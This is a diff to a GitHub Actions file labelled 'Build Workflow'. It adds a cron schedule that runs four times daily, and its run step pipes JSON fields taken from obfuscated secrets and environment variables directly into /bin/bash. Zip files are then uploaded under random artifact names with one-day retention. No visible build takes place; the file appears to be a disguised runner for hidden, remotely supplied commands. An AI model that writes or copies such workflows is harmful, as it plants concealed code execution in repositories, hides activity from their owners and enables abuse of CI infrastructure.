@@ -2,6 +2,8 @@ name: Build Workflow
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '36 5,11,17,23 * * *'
 permissions:
   contents: read
   actions: read
@@ -22,15 +24,16 @@ jobs:
           fetch-depth: 1
       - name: Invoke
         env:
-          lnfux1: ${{ secrets.lnfux1 }}
+          epz43642: ${{ secrets.epz43642 }}
         run: |
-          printf '%s' "$lnfux1" | jq -r .pyv8320 | /bin/bash
-          printf '%s' "$fa218" | jq -r .xl49351 | /bin/bash
+          printf '%s' "$epz43642" | jq -r .hrj3502 | /bin/bash
+          echo $bypy6702 | jq -r .a4 | /bin/bash
+          echo $nslfc64328 | jq -r .p724 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: KvKCXRjq
+          name: At4F29RN
           path: "*.zip"
           retention-days: 1
